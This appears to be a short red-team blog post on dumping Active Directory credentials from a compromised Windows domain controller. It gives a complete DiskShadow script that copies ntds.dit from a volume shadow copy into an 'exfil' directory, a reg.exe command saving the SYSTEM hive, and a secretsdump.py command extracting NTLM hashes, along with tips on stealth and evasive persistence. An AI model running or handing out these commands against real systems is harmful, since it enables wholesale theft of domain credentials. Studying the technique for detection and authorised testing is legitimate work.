<title>Pulling ntds.dit Locally/Remotely using DiskShadow</title>

What is DiskShadow?<br/>
“DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.“<br/>
<br/>
DiskShadow is included in Windows Server 2008, Windows Server 2012, and Windows Server 2016 and is a Windows signed binary.<br/>
<br/>
The VSS features of DiskShadow require privileged-level access (with UAC elevation), however, several command utilities can be invoked by a non-privileged user. This makes DiskShadow a very interesting candidate for command execution and evasive persistence.<br/>
<br/>
Assumptions:<br/>
<br/>
Compromise of an active DC<br/>
Running DiskShadow under privileged context in script mode<br/>
<br/>
diskshadow script (diskshadow.txt)<br/>
set context persistent nowriters<br/>
add volume c: alias someAlias<br/>
create<br/>
expose %someAlias% z:<br/>
exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit<br/>
delete shadows volume %someAlias%<br/>
reset<br/>
<br/>
In this script, we create a persistent shadow copy so that we can perform copy operations to capture the sensitive target file. By mounting a (unique) logical drive, we can guarantee a copy path for our target file, which we will extract to the ‘exfil’ directory before deleting our shadow copy identified by someAlias.<br/>
<br/>
*Note: We can attempt to copy out the target file by specifying a shadow device name /unique identifier. This is slightly stealthier, but it is important to ensure that labels/UUIDs are correct (via initial recon) or else the script will fail to run. This use case may be more suitable for Interactive Mode.<br/>
<br/>
In addition to the AD database, we will also need to extract the SYSTEM registry hive<br/>
<br/>
reg.exe save hklm\system c:\exfil\system.bak <br/>
<br/>
<br/>
<br/>
After transferring these files from the target machine, we use SecretsDump.py to extract the NTLM Hashes:<br/>
<br/>
secretsdump.py -ntds ntds.dit -system system.bak LOCAL				#secretsdump.py by Impacket</body></html>
